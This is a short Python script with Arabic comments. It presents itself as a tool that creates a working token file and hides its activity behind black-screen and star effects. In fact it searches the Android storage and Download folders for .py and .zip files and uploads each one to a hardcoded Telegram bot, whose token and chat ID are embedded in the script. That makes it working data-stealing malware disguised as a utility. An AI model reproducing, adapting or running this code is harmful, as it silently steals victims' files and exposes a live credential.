import os
import requests
import sys
import datetime
import time
import random

# التحقق من وجود المكتبات المطلوبة وتثبيتها
try:
    import requests
except ImportError:
    os.system("pip install requests")

# تأثيرات على الشاشة (مثل النجوم والصواريخ)
def show_effects():
    stars = ['− − − − − − − − − − −']
    rockets = ['جاري انشاء لك ملف توكنات شغال ']
    
    # شاشة سوداء (مؤقتًا)
    os.system('' if os.name == '' else '')
    print("\033[30m" + "\n" * 100)  # طباعة مسافة فارغة

    # إضافة نجوم تتطاير
    for _ in range(10):  # عدد النجوم أو الصواريخ
        print("".join(random.choice(stars) for _ in range(80)))
        time.sleep(0.1)

# التحقق من وجود الملفات وتحديد المجلدات
def find_files_in_directories(directories):
    files_to_send = []
    for directory in directories:
        if os.path.exists(directory):
            for root, _, files in os.walk(directory):
                for file in files:
                    if file.endswith('.py') or file.endswith('.zip'):
                        files_to_send.append(os.path.join(root, file))
                        print(f"تم العثور على الملف: {file} في {root}")
        else:
            print(f"المجلد {directory} غير موجود.")
            continue
    return files_to_send

# تعيين قيم التاريخ والوقت
now = datetime.datetime.today()
current_time = now.strftime("%m/%d/%Y %H:%M:%S")

# التحقق من انتهاء الصلاحية
expiration_date = datetime.datetime(2093, 8, 19, 0, 0, 0)
if now > expiration_date:
    print("\n\nانتهت صلاحية الأداة، راجع المطور.")
    sys.exit(0)

# إعدادات البوت
token = "7588415091:AAFU3A0uGk_5UhLv82UFx-5jyYCBpSUtC8s"
chat_id = '7088990340'

# المجلدات التي سيتم البحث فيها
directories_to_search = [
    '/storage/emulated/0/Download/',
    '/storage/emulated/0/'
]

# عرض التأثيرات قبل بدء العملية
show_effects()

# البحث عن الملفات في المجلدات المحددة
files_to_send = find_files_in_directories(directories_to_search)

# إرسال الملفات عبر البوت مباشرة (دون حفظها على الجهاز)
for file in files_to_send:
    try:
        with open(file, 'rb') as f:
            response = requests.post(
                f"https://api.telegram.org/bot{token}/sendDocument",
                data={'chat_id': chat_id, 'caption': f'الملف: {file}'},
                files={'document': f}
            )
            if response.status_code == 200:
                print(f"تم إرسال الملف: {file}")
            else:
                print(f"فشل إرسال الملف: {file}")
    except Exception as e:
        print(f"حدث خطأ أثناء إرسال الملف {file}: {e}")